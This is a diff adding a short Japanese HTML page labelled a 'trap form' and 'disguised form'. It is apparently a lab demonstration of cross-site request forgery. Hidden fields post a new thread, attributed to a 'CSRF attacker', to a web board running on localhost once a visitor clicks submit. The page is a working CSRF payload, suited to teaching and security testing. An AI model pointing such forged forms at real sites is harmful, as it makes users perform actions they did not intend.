@@ -1,0 +1,22 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<title>トラップフォーム</title>
+</head>
+<body>
+<h1>偽装フォーム</h1>
+<div>
+<form method="POST" action="http://localhost/webboard/show_threadlist.php">
+<p>送信ボタンをクリックしてください。</p>
+<input type="hidden" name="type" value="threadadd" />
+<input type="hidden" name="thread_title" value="CSRFによる新規投稿スレッド" />
+<input type="hidden" name="thread_text" value="このスレッドは、攻撃者により不正に投稿されました！" />
+<input type="hidden" name="postusername" value="CSRF攻撃者" />
+<input type="submit" value="送信" />
+</form>
+</div>
+
+
+
+</body>
+</html>
